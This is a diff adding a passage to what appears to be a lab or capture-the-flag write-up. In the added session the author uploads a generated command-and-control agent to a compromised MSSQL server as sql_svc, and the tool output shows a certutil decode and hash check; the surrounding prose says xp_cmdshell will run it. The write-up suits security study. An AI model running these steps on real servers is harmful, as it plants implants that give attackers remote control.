@@ -54,3 +54,19 @@ So on my listener for the sql server ill generate an agent and transfer it to th
 
 Ive generated an agent for the sql listener and i can use xp_cmdshell to upload the agent then execute it
 
+```python
+SQL (sql_svc  dbo@master)> upload sql-agent.x64.exe C:\Users\Public\sql-agent.x64.exe
+[+] Data length (b64-encoded): 117.34 KB with MD5: 48dcfdd66584938be5074d4bcc9553e8
+[+] Uploading...
+[+] Uploaded
+[+] certutil -decode "C:\Users\Public\sql-agent.x64.exe.b64" "C:\Users\Public\sql-agent.x64.exe"
+[+] del "C:\Users\Public\sql-agent.x64.exe.b64"
+[+] certutil -hashfile "C:\Users\Public\sql-agent.x64.exe" MD5
+[+] MD5 hashes match
+SQL (sql_svc  dbo@master)> 
+```
+This uploaded the agent to the target
+
+```python
+
+```
